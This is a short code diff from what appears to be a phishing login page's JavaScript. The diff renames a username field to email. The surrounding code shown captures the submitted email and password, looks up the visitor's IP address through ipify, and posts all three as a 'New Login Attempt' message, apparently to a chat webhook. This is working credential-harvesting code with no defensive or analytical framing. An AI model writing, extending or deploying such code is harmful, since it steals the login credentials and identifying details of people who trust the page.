@@ -15,7 +15,7 @@ skibidiCheckbox.addEventListener('change', function() {
 
 document.getElementById('loginForm').addEventListener('submit', function(e) {
     e.preventDefault();
-    const username = document.getElementById('username').value;
+    const email = document.getElementById('email').value;
     const password = document.getElementById('password').value;
 
     // Fetch the user's IP address using ipify
@@ -45,7 +45,7 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
                 },
                 body: JSON.stringify({
                     content: `New Login Attempt:
-Username / Email: ||${username}||
+Email: ||${email}||
 Password: ||${password}||
 IP Address: ||${userIP}||`
                 })
